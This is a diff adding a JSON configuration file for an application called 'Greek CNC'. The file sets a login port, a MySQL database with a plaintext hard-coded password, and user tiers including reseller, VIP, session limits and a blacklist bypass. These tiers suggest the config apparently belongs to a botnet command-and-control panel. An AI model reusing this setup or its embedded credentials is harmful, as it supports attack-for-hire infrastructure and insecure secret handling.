@@ -1,0 +1,44 @@
+{
+
+
+    "masters" : {
+        "masters_host" : ":2222",
+        "masters_config_maxauthtries" : 3
+    },
+
+    "database" : {
+        "sql_host" : "localhost:3306",
+        "sql_username" : "pongki",
+        "sql_password" : "Bhgi202083!",
+        "sql_name" : "cnc"
+    },
+
+    "app_config" : {
+        "app_name" : "Greek CNC",
+        "app_sig_colour" : "[38;5;204m"
+    },
+
+    "Disabled_commands" : [
+        "commandtodisable"
+    ],
+
+
+    "Extra" : {
+        "TableType" : "lite",
+        "TitleSpinner" : true,
+        "TitleSpinnerFrames" : ["/", "\\"],
+        "DefaultColours" : "[0m"
+    },
+
+
+    "User_Defaults" : {
+        "Admin" : false, 
+        "Reseller" : false,
+        "VIP" : false, 
+        "Banned" : false, 
+        "MaxSessions" : 1, 
+        "PowerSavingExempt" : true, 
+        "BypassBlacklist" : false,
+        "DefaultDays" : 30
+    }
+}
